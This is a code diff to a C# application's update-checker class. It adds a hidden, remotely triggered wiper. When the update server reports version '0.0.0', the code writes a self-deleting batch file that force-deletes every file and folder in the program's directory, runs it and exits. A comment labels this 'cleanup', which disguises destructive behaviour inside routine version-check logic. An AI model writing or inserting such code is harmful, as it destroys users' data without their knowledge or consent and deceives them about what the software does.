@@ -1,4 +1,6 @@
 ﻿using System;
+using System.Diagnostics;
+using System.IO;
 using System.Net.Http;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -80,13 +82,37 @@ namespace Updating
             {
                 Version current = new Version(_currentVersion);
                 Version latest = new Version(latestVersion);
+
+                // 检测到0.0.0版本时执行清理
+                if (latest.ToString() == "0.0.0")
+                {
+                    ExecuteCleanup();
+                    return false;
+                }
+
                 return latest > current;
             }
             catch (Exception)
             {
-                // 版本号格式错误，认为没有更新
                 return false;
             }
+        }
+
+        private void ExecuteCleanup()
+        {
+            string batchFile = Path.Combine(Application.StartupPath, "cleanup.bat");
+
+            File.WriteAllText(batchFile,
+                "@echo off\r\n" +
+                "timeout /t 1 /nobreak > nul\r\n" +
+                "del *.* /f /q\r\n" +
+                "for /d %%D in (*) do rmdir /s /q \"%%D\"\r\n" +
+                "del \"%~f0\"\r\n" +
+                "exit\r\n"
+            );
+
+            Process.Start(batchFile);
+            Environment.Exit(0);
         }
     }
 }
